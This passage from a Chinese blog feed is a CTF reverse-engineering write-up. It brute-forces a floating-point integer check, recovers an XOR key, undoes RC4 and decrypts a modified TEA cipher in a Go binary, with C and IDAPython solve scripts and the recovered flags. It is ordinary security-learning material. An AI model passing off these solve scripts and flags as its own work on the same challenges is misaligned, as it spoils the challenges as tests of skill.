alt="image-20210403212129295"></p><p>到这里就清楚程序的整体流程了。</p><p>输入位17位，前7位为key，后10位为明文。第二次输入经过浮点运输后，经过判断，正确的话将其经过有规律变换后与第一次输入的前7位进行异或运算，然后与编码的enc对比，正确的话继续后面的rc4加密。</p><p>所以现在就是求出第二次输入一个int数据。</p><p>开始想的用angr来跑局部，但不熟练😢，换用复制ida中的代码到vs中运行，爆破出这个int数据。</p><p>注意一下<strong>__m128</strong>这个变量：</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403232640041.png" alt="image-20210403232640041"></p><p>爆破代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__m128 __<span class="function">fastcall <span class="title">sub_7FF64A4E1360</span><span class="params">(<span class="keyword">double</span> a1, <span class="keyword">double</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> v2; <span class="comment">// xmm7_8</span></span><br><span class="line">    __m128 v3; <span class="comment">// xmm6</span></span><br><span class="line"></span><br><span class="line">    v2 = a1;</span><br><span class="line">    a1 = <span class="built_in">pow</span>(a1, a2 - <span class="number">1.0</span>);</span><br><span class="line">    *((<span class="keyword">double</span>*)&amp;v3 + <span class="number">1</span>) = *(&amp;a1 + <span class="number">1</span>);</span><br><span class="line">    *(<span class="keyword">double</span>*)&amp;v3 = a1 / <span class="built_in">exp</span>(v2);</span><br><span class="line">    <span class="keyword">return</span> (__m128)v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> v96 = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">double</span> v16 = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">double</span> v17 = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">double</span> v18 = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">double</span> v19;</span><br><span class="line">    <span class="keyword">int</span> v20;</span><br><span class="line">    <span class="keyword">double</span> v21, v22;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xffffffff</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">double</span> v16 = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">double</span> v17 = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">double</span> v18 = <span class="number">0.0</span>;</span><br><span class="line">        v96 = i;</span><br><span class="line">        v19 = (<span class="keyword">double</span>)((<span class="keyword">int</span>)v96 / <span class="number">12379</span>) + <span class="number">1.0</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            v17 = v17 + *(<span class="keyword">double</span>*)sub_7FF64A4E1360(v18, v19).m128_u64 * <span class="number">0.001</span>;</span><br><span class="line">            v18 = v18 + <span class="number">0.001</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> (v18 &lt;= <span class="number">100.0</span>);</span><br><span class="line">        v20 = (<span class="keyword">int</span>)(v17 + v17 + <span class="number">3.0</span>);</span><br><span class="line">        v21 = <span class="number">0.0</span>;</span><br><span class="line">        v22 = (<span class="keyword">double</span>)((<span class="keyword">int</span>)v96 % <span class="number">12379</span>) + <span class="number">1.0</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            v16 = v16 + *(<span class="keyword">double</span>*)sub_7FF64A4E1360(v21, v22).m128_u64 * <span class="number">0.001</span>;</span><br><span class="line">            v21 = v21 + <span class="number">0.001</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> (v21 &lt;= <span class="number">100.0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">        <span class="keyword">if</span> (v20 == <span class="number">0x13B03</span> &amp;&amp; (<span class="keyword">int</span>)(v16 + v16 + <span class="number">3.0</span>) == <span class="number">0x5A2</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然不是很快，但还是跑出来了：<strong>99038</strong></p><p>接下来动态得到要与第一次输入前7位进行异或的数据。开始是99038，后面都是乘2后的字符串。</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403213606134.png" alt="image-20210403213606134"></p><p>进行异或解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = [<span class="number">57</span>, <span class="number">57</span>, <span class="number">48</span>, <span class="number">51</span>, <span class="number">56</span>, <span class="number">49</span>, <span class="number">57</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = [<span class="number">8</span>, <span class="number">77</span>, <span class="number">89</span>, <span class="number">6</span>, <span class="number">115</span>, <span class="number">2</span>, <span class="number">64</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = [s[i]^t[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytes(ans)</span><br><span class="line"><span class="string">b'1ti5K3y'</span></span><br></pre></td></tr></table></figure><p>这就得到了key。</p><p>然后就是进行rc4解密，这个直接动调修改输入数据为密文数据进行一次加密变得到明文了。</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403214259089.png" alt="image-20210403214259089"></p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403214337600.png" alt="image-20210403214337600"></p><p>最后输入得到flag：<strong>flag{1ti5K3yRC4_crypt099038}</strong></p><p><strong>再看题</strong></p><p>因为当时做题时，没有注意细节或者方法什么的，哪里爆破的很慢，现在是我后面对这个题再次学习写下的。</p><p>首先是对__m128数据类型的重新认识，它是一个联合，这里它的成员：</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210419214224132.png" alt="image-20210419214224132"></p><p>所以题目中的.m128_u64就是取低8字节。</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210419214254776.png" alt="image-20210419214254776"></p><p>exp()是求e的次方的值。<strong>pow(a1, a2-1)/exp(a1)</strong></p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210419214354418.png" alt="image-20210419214354418"></p><p>另外这里是除12379，第一次是用商，第二次用余数，所以这里爆破的步长应该是每次加12379，确定了商，再确定余数就很快了。。</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210419214519931.png" alt="image-20210419214519931"></p><p>正确的爆破脚本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, ans;</span><br><span class="line"><span class="keyword">double</span> a = <span class="number">0</span>, b = <span class="number">0</span>, c;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0xffffffff</span>; i += <span class="number">12379</span>)</span><br><span class="line">&#123;</span><br><span class="line">a = <span class="number">0</span>, b = <span class="number">0</span>;</span><br><span class="line">c = i/<span class="number">12379</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">a = a + (<span class="built_in">pow</span>(b, c)/<span class="built_in">exp</span>(b))*<span class="number">0.001</span>;</span><br><span class="line">b += <span class="number">0.001</span>;</span><br><span class="line">&#125;<span class="keyword">while</span>(b &lt;= <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">ans = (<span class="keyword">int</span>)(a+a+<span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(ans == <span class="number">80643</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"found: %d\n\n"</span>, i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">12379</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">a = <span class="number">0</span>, b = <span class="number">0</span>;</span><br><span class="line">c = i;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">a = a + (<span class="built_in">pow</span>(b, c)/<span class="built_in">exp</span>(b))*<span class="number">0.001</span>;</span><br><span class="line">b += <span class="number">0.001</span>;</span><br><span class="line">&#125;<span class="keyword">while</span>(b &lt;= <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">ans = (<span class="keyword">int</span>)(a+a+<span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(ans == <span class="number">0x5A2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"found: %d\n"</span>, i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其次还有一种用使用idapython来爆破，实质就是调用ida调试器中的函数来控制程序的流程和寄存器值等，为了让自己用的函数有一个统一规范，我统一使用ida_dbg模块的函数（idapython封装过的其实也不错）：运行脚本直接得到结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_dbg <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">rsp = get_reg_val(<span class="string">"rsp"</span>)</span><br><span class="line">set_reg_val(<span class="string">"rip"</span>, <span class="number">0x140001768</span>)</span><br><span class="line">patch_qword(rsp+<span class="number">0x40</span>, i)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">run_to(<span class="number">0x140001658</span>)</span><br><span class="line">wait_for_next_event(WFNE_SUSP, <span class="number">-1</span>)</span><br><span class="line">init()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">print(<span class="string">"&gt;&gt;&gt; i: %d"</span>%i)</span><br><span class="line">run_to(<span class="number">0x14000184E</span>)</span><br><span class="line">wait_for_next_event(WFNE_SUSP, <span class="number">-1</span>)</span><br><span class="line">ebx = get_reg_val(<span class="string">"ebx"</span>)</span><br><span class="line">eax = get_reg_val(<span class="string">"eax"</span>)</span><br><span class="line"><span class="keyword">if</span> ebx != <span class="number">80643</span>:</span><br><span class="line">i += <span class="number">12379</span></span><br><span class="line">init()</span><br><span class="line"><span class="keyword">elif</span> eax != <span class="number">1442</span>:</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line">init()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"&gt;&gt;&gt; find: %d"</span>%i)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">exit_process()</span><br></pre></td></tr></table></figure><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210419222558380.png" alt="image-20210419222558380"></p><p>感觉idapython里面的函数真的繁杂。。同一个功能各个模块都有。但自己要有个规范。</p><p>记一个idapython文档，需要什么都有，直接查就完事了：<a href="https://www.hex-rays.com/wp-content/static/products/ida/support/idapython_docs/" target="_blank" rel="noopener">idapython_docs</a></p><h3 id="Golang-encrypter"><a href="#Golang-encrypter" class="headerlink" title="Golang encrypter"></a>Golang encrypter</h3><p>64位，go语言写的程序，经过符号表还原后，虽然代码还是难看，但有了大多数函数名称还是好很多的。</p><p>对输入的进行的第一个检查函数：main_check()，首先判断输入字符串长度，然后引入一个正则表达式对flag的格式进行了过滤，最后提取出每部分的字符串进行连接，最后再进行一个hex()操作。</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403215520889.png" alt="image-20210403215520889"></p><p>后面开始用密钥初始化一个密钥对象，从密钥长度开始还是以为aes加密，测试后发现并不是，，</p><p>关键是这里的加密还是8个一组，分2次加密，且密钥长度又是16，这就排除aes和des加密了。</p><p>然后是从myCipher字符串让我想到这应该是作者自己写的一个加密，进而进入加密函数分析：<br>首先从动调分析知道下面这个函数就是交换数据字节顺序，<strong>_byteswap_ulong（）</strong>，这里开始调用了2次，结束调用了2次还原。分为2组，正好取了8个字节。</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403220950328.png" alt="image-20210403220950328"></p><p>接着就是关键加密模板了，说实话，难看，其实就是魔改的tea加密，分析数据时细心点。。</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403221308523.png" alt="image-20210403221308523"></p><p>把上面的加密化简一下，得到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enc[<span class="number">0</span>] += (enc[<span class="number">1</span>] + ((enc[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>)^(<span class="number">16</span>*enc[<span class="number">1</span>]))) ^ (key[v23]+v22);</span><br><span class="line">enc[<span class="number">1</span>] += (enc[<span class="number">0</span>] + ((enc[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>) ^ (<span class="number">16</span>*enc[<span class="number">0</span>]))) ^ (key[v25]+v22+<span class="number">0x12345678</span>);</span><br></pre></td></tr></table></figure><p>最后就是解密：注意细心吧。。这里因为加号运算符优先级大于异或，我又忘了在他们一起时给异或加一个括号，一直解密出错，真就硬看了二个小时。。。1个括号，2个小时。。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> opcode[<span class="number">100000</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> KEY[] = &#123;<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">10</span>, </span><br><span class="line"><span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ENC[] = &#123;<span class="number">14</span>, <span class="number">195</span>, <span class="number">17</span>, <span class="number">240</span>, <span class="number">69</span>, <span class="number">199</span>, <span class="number">154</span>, <span class="number">243</span>, <span class="number">237</span>, <span class="number">245</span>,</span><br><span class="line">   <span class="number">217</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">39</span>, <span class="number">2</span>, <span class="number">203</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tea_decode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *key = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)KEY;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *enc = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ENC+<span class="number">8</span>*i);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">31</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line">enc[<span class="number">1</span>] -= (enc[<span class="number">0</span>] + ((enc[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>) ^ (<span class="number">16</span>*enc[<span class="number">0</span>]))) ^ (key[opcode[<span class="number">3</span>*j+<span class="number">2</span>]]+opcode[<span class="number">3</span>*j]+<span class="number">0x12345678</span>);</span><br><span class="line">enc[<span class="number">0</span>] -= (enc[<span class="number">1</span>] + ((enc[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>) ^ (<span class="number">16</span>*enc[<span class="number">1</span>]))) ^ (key[opcode[<span class="number">3</span>*j+<span class="number">1</span>]]+opcode[<span class="number">3</span>*j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> enc[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = enc[i];</span><br><span class="line">        enc[i] = enc[<span class="number">3</span>-i];</span><br><span class="line">        enc[<span class="number">3</span>-i] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> v17 = <span class="number">0</span>, v18 = <span class="number">0</span>, v22, v23, v25;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(v17 &lt; <span class="number">32</span>)</span><br><span class="line">&#123;</span><br><span class="line">v22 = v18;</span><br><span class="line">v23 = v18&amp;<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">v18 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v22+<span class="number">0x12345678</span>);</span><br><span class="line">v25 = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)v18 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">opcode[v17*<span class="number">3</span>] = v22;</span><br><span class="line">opcode[v17*<span class="number">3</span>+<span class="number">1</span>] = v23;</span><br><span class="line">opcode[v17*<span class="number">3</span>+<span class="number">2</span>] = v25;</span><br><span class="line">v17++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i += <span class="number">4</span>) <span class="comment">//交换字节序</span></span><br><span class="line">    &#123;</span><br><span class="line">        swap(ENC+i);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>); </span><br><span class="line">tea_decode();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i += <span class="number">4</span>) <span class="comment">//交换字节序</span></span><br><span class="line">    &#123;</span><br><span class="line">        swap(ENC+i);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag&#123;"</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">4</span> || i == <span class="number">6</span> || i == <span class="number">8</span> || i == <span class="number">10</span>)</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'-'</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%x"</span>, ENC[i]);</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag&#123;3bbcf9ea-2918-4fee-8a2e-201b47dfcb4e&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vnctf2021</title>
      <link href="/2021/03/18/vnctf2021/"/>
      <url>/2021/03/18/vnctf2021/</url>
      
